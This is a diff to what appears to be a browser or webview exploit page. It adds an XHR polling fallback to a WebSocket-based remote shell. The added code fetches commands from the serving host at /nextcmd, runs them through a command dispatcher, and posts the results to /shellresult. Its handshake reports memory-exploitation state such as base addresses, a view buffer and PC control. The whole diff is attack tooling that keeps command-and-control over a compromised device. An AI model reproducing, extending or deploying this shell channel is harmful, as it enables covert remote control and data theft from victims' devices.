@@ -4718,7 +4718,7 @@ function _startWsShell(){
   }
 
   var wsProto=(location.protocol==='https:')?'wss://':'ws://';
-  var wsUrl=wsProto+location.host;
+  var wsUrl=wsProto+location.host+'/';   /* FIX: explicit path - some WS implementations reject a pathless URL */
   b('SHELL-CONNECTING: '+wsUrl);
   var ws;
   try{ws=new WebSocket(wsUrl);}catch(e){b('SHELL-WS-FAIL: '+e.message);return;}
@@ -4733,8 +4733,7 @@ function _startWsShell(){
     ws.send(JSON.stringify(ready));
   };
 
-  ws.onmessage=function(evt){
-    var msg;try{msg=JSON.parse(evt.data);}catch(e){return;}
+  function shExec(msg){
     var reply={type:'result',id:msg.id};
     try{
       switch(msg.cmd){
@@ -5023,11 +5022,64 @@ function _startWsShell(){
     }catch(e){
       reply.err=String(e&&e.message?e.message:e);
     }
+    return reply;
+  }
+  ws.onmessage=function(evt){
+    var msg;try{msg=JSON.parse(evt.data);}catch(e){return;}
+    var reply=shExec(msg);
     try{ws.send(JSON.stringify(reply));}catch(se){}
   };
+  /* SHELL XHR FALLBACK: the guide webview's secure WS fails at transport
+   * level (1006). XHR to this origin is proven (every beacon). The page
+   * polls GET /nextcmd, executes, POSTs /shellresult - the identical
+   * command loop on the proven transport. Starts automatically when the
+   * WS errors or closes. */
+  var shPollOn=false;
+  function shStartPoll(){
+    if(shPollOn)return;shPollOn=true;
+    b('SHELL-POLL-START');
+    /* poll-mode handshake: POST the ready payload (the WS onopen equivalent) */
+    try{
+      var rd={type:'ready',base:S.hex(S.BASE),view:S.hex(S.viewBase),viewSize:S.viewSize,cell:S.hex(S.cell),pcControl:!!S.pcControl};
+      if(S.jf)rd.jf=S.hex(S.jf);
+      if(S.gq&&S.gq[7])rd.vm=S.hex(S.gq[7]);
+      if(S.cfr)rd.cfr=S.hex(S.cfr);
+      if(S.lowB)rd.lowB=S.hex(S.lowB);
+      if(S.jfuTop)rd.jfuTop=S.hex(S.jfuTop);
+      var rx=new XMLHttpRequest();
+      rx.open('POST','/shellresult',true);
+      rx.setRequestHeader('Content-Type','application/json');
+      rx.send(JSON.stringify(rd));
+    }catch(eR){}
+    function poll(){
+      var x=new XMLHttpRequest();
+      x.open('GET','/nextcmd',true);
+      x.onreadystatechange=function(){
+        if(x.readyState===4){
+          if(x.status===200){
+            var msg=null;try{msg=JSON.parse(x.responseText);}catch(e2){}
+            if(msg&&msg.cmd){
+              var reply=shExec(msg);
+              var y=new XMLHttpRequest();
+              y.open('POST','/shellresult',true);
+              y.setRequestHeader('Content-Type','application/json');
+              y.send(JSON.stringify(reply));
+              setTimeout(poll,50);
+            }else{
+              setTimeout(poll,250);
+            }
+          }else{
+            setTimeout(poll,1000);
+          }
+        }
+      };
+      try{x.send();}catch(e3){setTimeout(poll,1000);}
+    }
+    poll();
+  }
 
-  ws.onclose=function(){b('SHELL-WS-CLOSED');verd('bad','WS CLOSED');};
-  ws.onerror=function(e){b('SHELL-WS-ERROR');};
+  ws.onclose=function(ev){b('SHELL-WS-CLOSED-code='+(ev&&ev.code)+'-wasClean='+(ev&&ev.wasClean)+'-reason='+(ev&&ev.reason?String(ev.reason).substring(0,120):'?'));verd('bad','WS CLOSED - falling back to XHR poll');shStartPoll();};
+  ws.onerror=function(e){b('SHELL-WS-ERROR-detail='+(e&&e.message?String(e.message).substring(0,160):'no-message'));shStartPoll();};
 
   /* keepalive ping every 30s */
   setInterval(function(){
